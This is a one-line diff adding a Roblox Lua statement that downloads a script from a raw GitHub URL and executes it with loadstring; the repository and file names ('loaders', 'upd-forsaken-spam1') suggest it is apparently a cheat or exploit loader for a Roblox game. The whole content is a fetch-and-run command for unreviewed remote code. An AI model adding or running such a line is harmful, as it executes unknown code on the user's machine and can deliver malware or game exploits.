@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/upd-forsaken-spam1-436a5zk6egcczn.lua"))()
